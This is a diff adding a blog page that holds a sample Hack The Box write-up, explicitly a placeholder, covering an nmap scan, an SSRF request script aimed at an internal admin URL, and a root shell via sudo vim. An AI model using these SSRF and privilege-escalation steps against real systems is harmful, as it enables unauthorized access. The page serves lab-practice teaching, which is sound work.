@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=blog/livereload" data-no-instant defer></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTB: Machine Name — Writeup · Thiago Graeff</title>
+  <meta name="description" content="Foothold via SSRF, privesc through misconfigured sudo. Step-by-step walkthrough." />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/dist/tabler-icons.min.css" />
+  <link rel="stylesheet" href="http://localhost:1313/blog/css/main.css" />
+</head>
+<body>
+  <header class="topbar">
+  <div class="topbar-left">
+    <span class="live-dot"></span>
+    <span class="live-txt">ONLINE</span>
+    <span class="sep">·</span>
+    <a class="topbar-home" href="https://noxgraf.github.io/blog">
+      <i class="ti ti-arrow-left"></i> Thiago Graeff
+    </a>
+  </div>
+  <nav class="topbar-nav">
+    <a href="http://localhost:1313/blog/search"><i class="ti ti-search"></i></a>
+  </nav>
+</header>
+
+  <main class="main">
+    
+<article class="post">
+
+  <header class="post-header">
+    <p class="eyebrow">// 2024-06-01</p>
+    <h1 class="post-title">HTB: Machine Name — Writeup</h1>
+    <p class="post-desc">Foothold via SSRF, privesc through misconfigured sudo. Step-by-step walkthrough.</p>
+
+    <div class="post-meta">
+      <span class="reading-time"><i class="ti ti-clock"></i> 1 min read</span>
+      
+      <a class="ptag" href="/tags/ctf">#ctf</a>
+      
+      <a class="ptag" href="/tags/hackthebox">#hackthebox</a>
+      
+      <a class="ptag" href="/tags/ssrf">#ssrf</a>
+      
+      <a class="ptag" href="/tags/privesc">#privesc</a>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <h2 id="overview">Overview</h2>
+<p>This is a sample post — replace it with your real write-ups.</p>
+<p><strong>Difficulty:</strong> Medium<br>
+<strong>OS:</strong> Linux<br>
+<strong>Points:</strong> 30</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Starting with a standard nmap scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>nmap -sC -sV -oA nmap/initial 10.10.10.1
+</span></span></code></pre></div><p>The results showed ports 22 and 80 open. Let&rsquo;s check the web application.</p>
+<h2 id="foothold">Foothold</h2>
+<p>The application had a URL fetch feature — classic SSRF candidate.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#ff79c6">import</span> requests
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;http://127.0.0.1:8080/admin&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;https://target.htb/fetch?url=</span><span style="color:#f1fa8c">{</span>payload<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span><span style="color:#8be9fd;font-style:italic">print</span>(r<span style="color:#ff79c6">.</span>text)
+</span></span></code></pre></div><blockquote>
+<p><strong>Note:</strong> Always check internal services when you find an SSRF. Cloud metadata endpoints are a goldmine.</p>
+</blockquote>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Checking sudo permissions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>sudo -l
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#6272a4"># (root) NOPASSWD: /usr/bin/vim</span>
+</span></span></code></pre></div><p>Easy privesc via <code>vim</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>sudo vim -c <span style="color:#f1fa8c">&#39;:!/bin/bash&#39;</span>
+</span></span></code></pre></div><h2 id="flags">Flags</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Flag</th>
+          <th>Hash</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>user.txt</td>
+          <td><code>deadbeef...</code></td>
+      </tr>
+      <tr>
+          <td>root.txt</td>
+          <td><code>cafebabe...</code></td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="lessons-learned">Lessons Learned</h2>
+<ul>
+<li>Always enumerate internal services when you find SSRF</li>
+<li><code>sudo -l</code> should be one of the first privesc checks</li>
+<li>Document everything — it pays off in report writing</li>
+</ul>
+
+  </div>
+
+  <nav class="post-nav">
+    
+    <a class="post-nav-btn" href="http://localhost:1313/blog/posts/osint-recon-techniques/">
+      <i class="ti ti-arrow-left"></i>
+      <span>OSINT on a Budget: Recon Techniques That Actually Work</span>
+    </a>
+    
+    
+  </nav>
+
+</article>
+
+  </main>
+  <footer class="footer">
+  <span>Thiago Graeff · 2026</span>
+  <span class="footer-status">● src on <a href="https://github.com/noxgraf" target="_blank" rel="noopener">github</a></span>
+</footer>
+
+</body>
+</html>
